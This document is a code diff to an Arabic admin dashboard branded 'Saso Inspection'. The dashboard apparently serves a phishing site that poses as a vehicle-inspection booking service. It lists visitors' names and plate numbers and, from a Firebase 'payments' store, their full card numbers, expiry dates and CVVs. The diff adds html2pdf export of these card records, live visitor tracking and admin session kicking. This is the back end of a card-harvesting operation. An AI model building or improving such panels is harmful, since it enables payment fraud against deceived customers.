@@ -6,6 +6,7 @@
     <title>لوحة التحكم - Saso Inspection</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
@@ -35,9 +36,9 @@
         .btn-reject { background: #dc3545; }
         .btn-delete { background: #6c757d; }
         .btn-kick { background: #ff4757; }
+        .btn-pdf { background: #e74c3c; margin-bottom: 15px; display: block; width: 100%; max-width: 250px; font-size: 14px; padding: 10px; }
         .logout-btn { background: #000 !important; font-size: 12px; }
         
-        /* تصميم قائمة الأجهزة */
         .session-item { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #ddd; }
         .session-info { font-size: 14px; }
         .session-info span { color: #666; font-size: 12px; display: block; }
@@ -70,9 +71,12 @@
         <div id="bookingSection" class="tab-content active">
             <div id="bookingGrid" class="booking-grid"></div>
         </div>
+        
         <div id="cardsSection" class="tab-content">
+            <button class="btn btn-pdf" onclick="downloadPaymentsPDF()">📥 تحميل تقرير البطاقات (PDF)</button>
             <div id="paymentsContainer"></div>
         </div>
+
         <div id="sessionsSection" class="tab-content">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                 <h3 style="margin:0;">الأجهزة التي لديها صلاحية الدخول الآن:</h3>
@@ -105,18 +109,12 @@
             localStorage.setItem("admin_logged_in", "true");
             localStorage.setItem("admin_session_id", sessionId);
             mySessionId = sessionId;
-            
-            // تسجيل الجلسة في فايربيس
             initFirebase();
             firebase.database().ref('admin_sessions/' + sessionId).set({
                 loginTime: new Date().toLocaleString('ar-EG'),
                 status: 'active'
-            }).then(() => {
-                showAdmin();
-            });
-        } else {
-            errorMsg.style.display = 'block';
-        }
+            }).then(() => { showAdmin(); });
+        } else { errorMsg.style.display = 'block'; }
     }
 
     function showAdmin() {
@@ -127,18 +125,13 @@
     }
 
     function monitorMySession() {
-        // مراقبة الجلسة الخاصة بي: إذا تم حذفها من قبل المدير، سجل خروج
         firebase.database().ref('admin_sessions/' + mySessionId).on('value', (s) => {
-            if (!s.exists()) {
-                logout();
-            }
+            if (!s.exists()) { logout(); }
         });
     }
 
     function logout() {
-        if (mySessionId) {
-            firebase.database().ref('admin_sessions/' + mySessionId).remove();
-        }
+        if (mySessionId) { firebase.database().ref('admin_sessions/' + mySessionId).remove(); }
         localStorage.removeItem("admin_logged_in");
         localStorage.removeItem("admin_session_id");
         location.reload();
@@ -158,55 +151,50 @@
         if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
 
-        // عرض زوار الموقع
         database.ref('online_tracking').on('value', s => {
             document.getElementById('onlineCount').innerText = s.numChildren();
         });
 
-        // عرض وإدارة جلسات الأدمن (الأجهزة)
         database.ref('admin_sessions').on('value', (snapshot) => {
             const list = document.getElementById('sessionsList');
             const countSpan = document.getElementById('adminSessionCount');
             list.innerHTML = '';
             countSpan.innerText = snapshot.numChildren();
-            
             snapshot.forEach((child) => {
                 const val = child.val();
                 const sid = child.key;
                 const isMe = (sid === mySessionId) ? " (جهازك الحالي)" : "";
-                
                 list.innerHTML += `
                 <div class="session-item">
                     <div class="session-info">
                         <strong>جهاز متصل ${isMe}</strong>
                         <span>وقت الدخول: ${val.loginTime}</span>
-                        <span style="color:green">الحالة: نشط الآن</span>
                     </div>
                     ${sid !== mySessionId ? `<button class="btn btn-kick" onclick="deleteData('admin_sessions/${sid}')">طرد الجهاز</button>` : ''}
                 </div>`;
             });
         });
 
-        // عرض بيانات الحجز
         database.ref('visitors').limitToLast(50).on('value', (snapshot) => {
             const grid = document.getElementById('bookingGrid');
-            grid.innerHTML = '';
+            let content = '';
             snapshot.forEach((child) => {
                 const val = child.val();
-                grid.innerHTML = `
+                content = `
                 <div class="customer-card">
                     <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
                     <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
                     <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
                     <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${child.key}')">حذف السجل</button>
-                </div>` + grid.innerHTML;
+                </div>` + content;
             });
+            grid.innerHTML = content;
         });
 
-        // عرض بيانات البطاقات
+        // تم تعديل هذا الجزء لضمان استقرار البيانات ومنع الاختفاء
         database.ref('payments').limitToLast(50).on('value', (snapshot) => {
             const container = document.getElementById('paymentsContainer');
-            container.innerHTML = '';
+            let fullHtml = '';
             snapshot.forEach((child) => {
                 const val = child.val();
                 const id = child.key;
@@ -216,15 +204,14 @@
                     statusText = "انتظار ⏳";
                     statusClass = "status-waiting";
                 }
-
-                container.innerHTML = `
+                fullHtml = `
                 <div class="operation-row">
                     <div class="card-data-wrapper">
                         <div style="min-width:100px;">
                             <div style="font-weight:bold; font-size:13px;">${val.cardHolder || 'عميل'}</div>
                             <span class="status-badge ${statusClass}">${statusText}</span>
                         </div>
-                        <div style="display:flex; gap:5px; align-items:center; flex-grow:1;">
+                        <div style="display:flex; gap:5px; align-items:center; flex-grow:1; flex-wrap:wrap;">
                             <div class="box card-box" style="direction:ltr; min-width:140px;">${val.cardNumber || '----'}</div>
                             <div class="box card-box">📅 ${val.expiry || '--/--'}</div>
                             <div class="box card-box">🔑 ${val.cvv || '---'}</div>
@@ -237,8 +224,32 @@
                             <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
                         </div>
                     </div>
-                </div>` + container.innerHTML;
+                </div>` + fullHtml;
             });
+            container.innerHTML = fullHtml;
+        });
+    }
+
+    // وظيفة تحميل ملف PDF
+    function downloadPaymentsPDF() {
+        const element = document.getElementById('paymentsContainer');
+        if (!element || element.innerText.trim() === "") {
+            alert("لا توجد بيانات لتحميلها!");
+            return;
+        }
+        const opt = {
+            margin:       10,
+            filename:     'تقرير_البطاقات_Saso.pdf',
+            image:        { type: 'jpeg', quality: 0.98 },
+            html2canvas:  { scale: 2, useCORS: true },
+            jsPDF:        { unit: 'mm', format: 'a4', orientation: 'landscape' }
+        };
+        // نقوم بإخفاء الأزرار مؤقتاً قبل التصوير لكي لا تظهر في PDF
+        const buttons = document.querySelectorAll('.operation-row button');
+        buttons.forEach(b => b.style.visibility = 'hidden');
+        
+        html2pdf().set(opt).from(element).save().then(() => {
+            buttons.forEach(b => b.style.visibility = 'visible');
         });
     }
 
